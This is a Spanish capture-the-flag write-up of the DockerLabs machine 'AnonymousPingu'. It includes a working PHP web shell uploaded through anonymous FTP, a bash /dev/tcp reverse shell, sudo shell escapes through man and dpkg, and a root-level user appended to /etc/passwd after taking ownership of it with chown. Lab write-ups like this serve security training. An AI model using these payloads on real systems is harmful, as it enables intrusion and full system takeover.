
---
# Writeup Template: Maquina `[AnonymousPingu]`

- Tags: `#AnonymousPingu` 
- Dificultad: `Facil`
- Plataforma: `[ DockerLabs ]`

---
## Enlace al laboratorio
[Maquina Anonymous](https://mega.nz/file/dOMzjDjS#hByTSHdcOL9E3v8bI5Yd0SWEyYyrhwn5FvA2PUAY5pE)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x anonymouspingu.zip
sudo bash auto_deploy.sh anonymouspingu.tar
```

---

## Fase de Reconocimiento
### Identificación del Target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
```bash
wichSystem.py 172.17.0.2
172.17.0.2 (ttl -> 64): Linux
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
```bash
nmap -sCV -p21,80 [IP_TARGET] -oN targeted
```

**Servicios identificados:**
1. `21 / FTP`: ( vsftpd 3.0.5 )
2. `80 / TCP`: ( Apache httpd 2.4.58 ) ( **ubuntuNoble** ) 
---
## Enumeración de `[ FTP Service ]`
Tenemos este servicio expuesto para poder enumerarlo usaremos un **script** de la herramienta **Nmap**
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2

# Resultado
-rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
-rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
drwxr-xr-x    2 0        0            4096 Apr 28  2024 heustonn-html
drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
-rw-r--r--    1 0        0           20162 Apr 28  2024 index.html
drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
-rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
drwxrwxrwx    2 33       33           4096 Apr 28  2024 upload [NSE: writeable]
```
Tenemos el usuario **Anonymous** habilitado: ( Anonymous FTP login allowed ) por lo cual nos podemos conectar a este servicio sin proporcionar contrasena.
```bash
ftp 172.17.0.2 # Nos logueamos
```
Tenemos capacidad de escritura sobre este direcorio: **( upload )** aqui podemos cargar un archivo que nos permita derivar a una ejecucion remota de comandos: **( RCE )**
```bash
drwxrwxrwx    2 33       33           4096 Apr 28  2024 upload
```

## Enumeración de `[Servicio Web Principal]`
### Tecnologías Detectadas
```bash
whatweb http://[IP_TARGET] # Realizamos deteccion de las tecnologias empleadas por la web.

http://172.17.0.2 [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.4.1], Script[text/javascript], Title[Mantenimiento], X-UA-Compatible[IE=edge
```

Realizamos reconocimiento de rutas en la web.
```bash
nmap --script http-enum -p 80 172.17.0.2

# Resultado
/upload/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
Tenemos una via potencial de cargar archivos en esta ruta. a la cual tenemos acceso desde **FTP** y tenemos capaciada de escritura.
- `[ /upload/ ]`: [ Potentially interesting directory w/ ]

- **Hallazgos**:
```bash
/images/              (Status: 200) [Size: 5993]
/icons/               (Status: 403) [Size: 275]
/upload/              (Status: 200) [Size: 739]
/css/                 (Status: 200) [Size: 1744]
/js/                  (Status: 200) [Size: 1149]
```

### Script Malicioso
`shell.php` Crearemos un script que nos permita realizar una llamda a nivel de sistema para ejecutar un comando, El cual cargaremos desde el servicio **FTP**.
```php
<?php
  system($_GET["cmd"]);
?>
```
Sabiendo que tenemos capacidad de escritura, Nos conectamos al servicio y cargamos el archivo:
```bash
ftp 172.17.0.2 ( Anonymous )
```

`/upload` Estando en este directorio cargamos el recurso
```bash
put shell.php
```
---
## Explotación de Vulnerabilidades
### Vector de Ataque
Ahora tenemos ejecucion remota de comandos en el **target**.
### Ejecución del Ataque
```bash
# Comandos para explotación
172.17.0.2/upload/shell.php?cmd=whoami

# Output
www-data
```
### Intrusion
Ganando acceso al **target**
```bash
# Reverse shell o acceso inicial
172.17.0.2/upload/shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/IP_TARGET/PORT <%261'
```
---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l

User www-data may run the following commands on 874cd377c371:
    (pingu) NOPASSWD: /usr/bin/man # Tenemos una via potencial de migrar a este usuario.
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/man ]`
- Credenciales de usuario: `[ pingu ]`

### Explotacion de Privilegios
```bash
# Comando para escalar al usuario: ( pingu )
sudo -u pingu /usr/bin/man man # Primero ejecutamos este
!/bin/bash # Estando en modo manual ejecutamos esta linea y le damos enter
```

```bash
# Comando claves ejecutados
sudo -l

User pingu may run the following commands on 874cd377c371:
    (gladys) NOPASSWD: /usr/bin/nmap # Tenemos estos binarios para migrar a este usuario
    (gladys) NOPASSWD: /usr/bin/dpkg
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/nmap ]`
- Binario con privilegios: `[ /usr/bin/dpkg ]`
- Credenciales de usuario: `[ gladys ]`

```bash
# Comando para escalar al usuario: ( gladys )
sudo -u gladys /usr/bin/dpkg -l # Primero ejecutamos este
!/bin/bash # Despues ejecutamos este.
```

```bash
# Comando claves ejecutados
sudo -l 
User gladys may run the following commands on 874cd377c371:
    (root) NOPASSWD: /usr/bin/chown
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/chown ]`
- Credenciales de usuario: `[ root ]`

Modificamos para que ahora seamos propietarios de este archivo, el cual nos permita quitarle la: **( x )** al usuario **root** para poder conectarnos como el sin proporcionar contrasena.
```bash
# Comando para escalar al usuario: ( root )
sudo chown $(id -un):$(id -gn) /etc/passwd

# Ahora este archivo nos pertenece
-rw-r--r-- 1 gladys gladys 1292 Apr 28  2024 /etc/passwd
```

**Nota** Como no tenemos ningun editor de terminar, Tendremos que crear un nuevo usuario en el sistema con privilegios de root:
Necesitaremos una cotrasena para este nuevo usuario ( 123456789 ):
```bash
openssl passwd 123456789

$1$iznhwVY8$1Yg1ZFulPDGLahK.R4Mjv0 # hash
```

Crearemos un nuevo usuario: **( privileged )** 
```bash
/home/pingu$ echo 'privilegeds:$1$iznhwVY8$1Yg1ZFulPDGLahK.R4Mjv0:0:0::/home/privilegeds:/bin/bash' >> /etc/passwd
```

Nos conectamos como este nuevo usuario y proporsionamos su contrasena: ( 123456789 )
```bash
su privilegeds
```
---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@874cd377c371:/root# whoami
root
```
---

## Lecciones Aprendidas
1. Usuario **Anonymous** del servicio **FTP** es una falla de seguridad critica
2. Cargamos archivos maliciosos conectados con la web
3. Explotacion de los siguientes bianrios: **( man, dpkg, chown )**

## Recomendaciones de Seguridad
- Deshabilitar al usuario **Anonymous**
- Restringir y validar la carga de archivos desde el servicio **FTP**